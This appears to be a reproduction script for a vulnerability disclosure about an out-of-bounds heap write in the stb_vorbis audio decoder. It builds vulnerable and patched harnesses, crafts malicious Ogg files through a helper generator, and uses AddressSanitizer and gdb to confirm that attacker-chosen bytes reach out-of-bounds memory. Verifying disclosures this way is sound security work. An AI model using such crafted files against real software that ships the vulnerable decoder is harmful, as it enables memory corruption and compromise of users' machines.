#!/bin/sh
# Reproduce the CVE-2026-89266 write, chosen bytes, and both controls.
# Requires gcc, gdb, python3. Run from any directory.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE" || exit 2
mkdir -p evidence build/vuln build/fixed
cp harness.c pinned/stb_vorbis.c build/vuln/
cp harness.c build/fixed/
cp pinned/stb_vorbis-dev.c build/fixed/stb_vorbis.c
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -o build/vuln/harness build/vuln/harness.c -lm || exit 2
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -o build/fixed/harness build/fixed/harness.c -lm || exit 2
gcc -g -O0 -o build/vuln/harness-plain build/vuln/harness.c -lm || exit 2
gcc -g -O0 -o build/fixed/harness-plain build/fixed/harness.c -lm || exit 2
python3 gen_poc.py evidence/exploit.ogg >/dev/null || exit 2
python3 gen_poc.py evidence/chosen.ogg 16519105 65 0x4b434148 >/dev/null || exit 2
printf 'not an ogg file\n' > evidence/safe-input.bin
PASS=0; FAIL=0
check() {
  name=$1; expected=$2; actual=$3
  if [ "$expected" = "$actual" ]; then PASS=$((PASS+1)); echo "PASS $name rc=$actual"
  else FAIL=$((FAIL+1)); echo "FAIL $name expected=$expected actual=$actual"; fi
}
ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./build/vuln/harness evidence/exploit.ogg > evidence/asan-vuln-attack.out 2>&1; check asan_vuln_attack 1 $?
grep -q 'WRITE of size 4' evidence/asan-vuln-attack.out && grep -q 'stb_vorbis.c:3889' evidence/asan-vuln-attack.out && grep -q 'stb_vorbis.c:3880' evidence/asan-vuln-attack.out && { PASS=$((PASS+1)); echo 'PASS asan_sink_and_alloc_site'; } || { FAIL=$((FAIL+1)); echo 'FAIL asan_sink_and_alloc_site'; }
ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./build/fixed/harness evidence/exploit.ogg > evidence/asan-fixed-attack.out 2>&1; check asan_fixed_attack 0 $?
ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./build/vuln/harness evidence/chosen.ogg > evidence/asan-vuln-chosen.out 2>&1; check asan_vuln_chosen 1 $?
ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./build/fixed/harness evidence/chosen.ogg > evidence/asan-fixed-chosen.out 2>&1; check asan_fixed_chosen 0 $?
./build/vuln/harness-plain evidence/exploit.ogg > evidence/plain-vuln-attack.out 2>&1; check plain_vuln_attack 134 $?
./build/fixed/harness-plain evidence/exploit.ogg > evidence/plain-fixed-attack.out 2>&1; check plain_fixed_attack 0 $?
./build/vuln/harness-plain evidence/safe-input.bin > evidence/plain-vuln-safe.out 2>&1; check plain_vuln_safe 0 $?
gdb -q -batch -ex 'break stb_vorbis.c:3890' -ex 'ignore 1 2' -ex 'run evidence/chosen.ogg' -ex 'p/x *(unsigned int *)&val' -ex 'p/x *(unsigned int *)&c->multiplicands[2]' -ex 'p j' -ex 'p k' ./build/vuln/harness-plain > evidence/gdb-chosen.out 2>&1
grep -q '\$1 = 0x4b434148' evidence/gdb-chosen.out && grep -q '\$2 = 0x4b434148' evidence/gdb-chosen.out && { PASS=$((PASS+1)); echo 'PASS gdb_chosen_bytes_at_first_oob_offset j=0 k=2'; } || { FAIL=$((FAIL+1)); echo 'FAIL gdb_chosen_bytes_at_first_oob_offset'; }
for f in pinned/stb_vorbis.c pinned/stb_vorbis-dev.c evidence/exploit.ogg evidence/chosen.ogg; do sha256sum "$f"; done
echo "TOTAL PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
